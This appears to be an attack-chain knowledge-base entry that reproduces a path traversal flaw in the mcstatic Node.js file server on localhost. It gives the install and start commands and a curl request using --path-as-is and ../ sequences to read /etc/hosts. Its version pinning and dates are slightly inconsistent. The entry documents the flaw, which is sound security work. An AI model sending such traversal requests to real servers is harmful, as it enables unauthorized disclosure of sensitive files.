---
tags:
  - path-traversal
  - node.js
  - file-disclosure
  - arbitrary-read
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/npm-install-mcstatic]]'
  - '[[commands/start-mcstatic-server]]'
  - '[[commands/curl-path-traversal-exploit]]'
platforms:
  - Linux
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Install-mcstatic-Module]]'
  - '[[procedures/Start-mcstatic-Server]]'
  - '[[procedures/Exploit-Path-Traversal-with-Curl]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
description: >-
  Multi-stage exploitation of a path traversal vulnerability in the mcstatic
  Node.js file server to disclose arbitrary files on the host system.
skill_level: intermediate
impact_level: high
id: 2757a801-8116-489b-bfe7-6e52a1054322
created_at: '2025-12-14T17:26:12.264Z'
updated_at: '2025-12-14T17:26:12.264Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Path Traversal in mcstatic Node.js Module to Read Arbitrary Server Files

Multi-stage attack chain demonstrating the exploitation of a path traversal vulnerability in the mcstatic Node.js module, allowing attackers to read sensitive files outside the served directory, such as system configuration files.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Start File Server]
    B --> C[Exploit Path Traversal]
    C --> D[File Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/curl]]

### Target Environment

- Node.js runtime (v8.9.4 or compatible)
- Linux-based host for file access demonstration
- Port 8080 available for server binding

### Initial Access Requirements

- Local access to install and run Node.js modules
- No remote credentials needed; assumes control over the server environment
- Network access to localhost:8080 for exploitation

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-mcstatic-Module]]

**Objective**: Set up the vulnerable mcstatic module in the environment to enable server startup.

**Instructions**: Use [[commands/npm-install-mcstatic]] to install the vulnerable version 0.0.20 of mcstatic from npm.

```bash
npm install mcstatic
```

**Expected Output**: Installation logs confirming the package is added to node_modules, including dependencies.

**Success Indicators**:
- mcstatic directory appears in node_modules
- No installation errors

### Step 2: Start File Server
procedure: [[procedures/Start-mcstatic-Server]]

**Objective**: Launch the mcstatic server to expose the file serving functionality with the path traversal vulnerability.

**Instructions**: Execute [[commands/start-mcstatic-server]] from the project directory to start serving files on port 8080.

```bash
./node_modules/mcstatic/bin/mcstatic
```

**Expected Output**: Console message indicating "mcstatic serving ./ on port 8080" and the server listening.

**Success Indicators**:
- Server process running without errors
- Accessible via http://127.0.0.1:8080 for normal file requests

### Step 3: Exploit Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-with-Curl]]

**Objective**: Send a crafted HTTP request to traverse directories and read arbitrary files like /etc/hosts.

**Instructions**: With the server running, use [[commands/curl-path-traversal-exploit]] to request a path with '../' sequences, bypassing normalization.

```bash
curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

**Expected Output**: HTTP 200 OK response with verbose headers and the contents of /etc/hosts, such as "127.0.0.1 localhost" lines.

**Success Indicators**:
- File contents returned in response body
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Successful installation and startup of the vulnerable mcstatic server
2. Exploitation of path traversal to access files outside the root directory
3. Disclosure of sensitive system files, demonstrating potential for information leakage

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]
- [[Collection]]

---
*Last updated: 2023-10-01*
